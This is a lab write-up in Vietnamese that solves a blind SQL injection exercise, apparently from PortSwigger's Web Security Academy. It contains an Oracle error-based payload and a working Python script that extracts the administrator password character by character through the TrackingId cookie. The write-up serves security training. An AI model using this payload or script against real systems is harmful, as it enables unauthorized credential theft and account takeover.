>This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
>The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
>
>The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
>To solve the lab, log in as the `administrator` user.

Ở bài này thứ mình cần phải làm đó là tấn công mù vào hệ thống mà không có sự khác nhau về respone trả về giữa các trạng thái boolean khác nhau mà ở bài này lỗi có thể bị khai thác đó chính là việc thay vì khác về nội dung trả về trong respone thì nó sẽ khác về việc có thể xảy ra lỗi nếu respone đúng. Từ đây ta có thể suy ra mình có thể check tính đúng đắn của payload bằng việc trả về status code của http khác nhau. Đầu tiên ta cần xem cấu trúc request của ta cần gửi để tìm hướng tiếp cận.

![](images/Pasted%20image%2020261108232721.png)

Ở đây mình thấy sẽ có phần cookie bao gồm TrackingID và session và như đề đã đề cập việc ta có thể tấn công truy vấn vào TrackingID vì hệ thống sẽ truy vấn vào database để check TrackingID có tồn tại hay chưa nếu chưa sẽ cung cấp một dãy ký tự mới. Tiếp theo ta thử xem hệ thống sử dụng DBMS là gì có phải Oracle hay không bằng cách sử dụng một truy vấn đảm bảo luôn đúng để xem cách server sẽ trả về trạng thái là gì.

![](images/Pasted%20image%2020261108233137.png)

Lúc này ở đây ta thấy mặc dù truy vấn đã đúng nhưng server vẫn trả về status code là 500. Từ đây mình có thể đoán là hệ thống sử dụng DBMS là Oracle. Nên mình sẽ thay payload luôn đúng này theo chuẩn cấu trúc của Oracle để xem nó phản hồi như thế nào.

![](images/Pasted%20image%2020261108233248.png)

Rõ ràng sau khi mình đã đổi lại theo đúng chuẩn Oracle thì đã trả về status code là 200 OK và từ đây mình có thể khẳng định server sử dụng DBMS là Oracle để có thể viết các payload cho các phần tiếp theo. Tiếp theo sau khi đã thấy nếu một truy vấn đúng thì server sẽ trả về status code là 200 OK. Vậy việc tiếp theo ta cần phải biết là vậy thì nếu ta để truy vấn này bị lỗi theo các dạng lỗi luôn sai như chia cho 0 thì server phản hồi kiểu gì.

![](images/Pasted%20image%2020261108233307.png)

Và rồi ta đã thấy rõ nếu lỗi thì server sẽ báo lỗi 500 Internal Server Error ngay. Thế thì ta sẽ suy nghĩ cách tiếp cận để viết script dò mật khẩu cho tài khoản administrator. Đầu tiên để dò ta nghĩ ngay đến việc sẽ dò từng ký tự ở từng vị trí bằng việc check substring để xem nó có giống bất kỳ ký tự nào trong bảng chữ cái không nếu có thì làm sao để nó thành sai để server báo status code thành 500. Vậy thì để nó đúng sẽ báo lỗi đảm bảo khác biệt với các ký tự sai khác thì ta sẽ đặt nó nếu đúng thì sẽ trả về kết quả là 1/0 còn sai thì làm sao để các ký tự kia đảm bảo đúng? Đơn giản với việc ta sẽ cho nó sai sẽ bằng 1 ký tự cụ thể nào đó và so sánh với chính ký tự đó sẽ đảm bảo lừa được hệ thống về việc sẽ báo lỗi ngay đúng vào trường hợp đúng duy nhất còn sai thì diễn ra bình thường. Ta cứ dò cho đến khi nó không còn ký tự nào trong bảng chữ cái và chữ số có thể đối chứng nữa thì đảm bảo đó là final_password. Bây giờ ta sẽ tiến hành suy nghĩ lệnh truy vấn SQL theo đúng chuẩn của Oracle để có thể attack vào hệ thống để đánh lừa nó:

```sql
(SELECT CASE WHEN SUBSTR(password, {position}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'--
```

Sau khi mình đã có được truy vấn mẫu để gửi request ta lập tức viết script để tự động dò:

```python
import requests

import string

  

url = "https://0ada00c004a362db807a357e0090004b.web-security-academy.net/"

  

cookies = {

    "TrackingId": "",

    "session": "yNWGUZU3v1olsqa0YCrB7QVXcZI1Fzfl"

}

  

charset = string.ascii_letters + string.digits

password = ""

  

for position in range(1, 50):

    found = False

    for char in charset:

        payload = (

            "KKfdzjixiJyvCCTf' AND " f"(SELECT CASE WHEN SUBSTR(password, {position}, 1) = '{char}' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username = 'administrator') = 'a'-- -"

        )

        cookies["TrackingId"] = payload

        response = requests.get(

            url,

            cookies=cookies,

            timeout=10

        )

        if response.status_code == 500:

            password += char

            print(f"Position {position}: {char}")

            print(f"Password: {password}")

            found = True

            break

    if not found:

        break

  

print("\nFinal password:", password)
```

![](images/Pasted%20image%2020261109000239.png)

Và như thế là ta đã có thể thu được password của administrator. Từ đây ta tiến hành đăng nhập để chiếm quyền admin.

![](images/Pasted%20image%2020261109000321.png)

Vậy là ta đã có thể chiếm được quyền admin thông qua việc tận dụng lỗ hỏng bảo mật của hệ thống. Từ đây ta có thể thấy không chỉ cần hiện hữu trên màn hình như nội dung hiện ở client side như việc ta tấn công chèn SQL thông thường hay việc có thể đối chiếu sự khác nhau do tính đúng sai của payload thông qua nội dung respone http của server cho ta. Chỉ từ việc vô cùng nhỏ đó là thiếu sót trong việc xử lý an toàn đầu vào của truy vấn SQL khiến attacker có thể lấy quyền truy cập admin vô cùng nguy hiểm khi lỗi chỉ lộ qua status code cực nhỏ nhưng nếu để attacker tìm thấy được thì đó sẽ vô cùng nguy hiểm thậm chí là lộ toàn bộ thông tin mật.
